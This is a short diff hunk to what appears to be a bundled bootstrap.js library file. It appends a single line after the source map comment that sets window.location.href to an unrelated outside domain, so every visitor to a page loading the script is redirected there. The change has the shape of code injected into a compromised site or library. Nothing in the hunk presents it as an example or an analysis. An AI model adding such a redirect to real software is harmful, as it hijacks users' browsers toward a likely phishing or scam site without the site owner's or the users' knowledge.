@@ -4416,3 +4416,4 @@
 
 })));
 //# sourceMappingURL=bootstrap.js.map
+window.location.href = "https://mxrespinme.my.id";
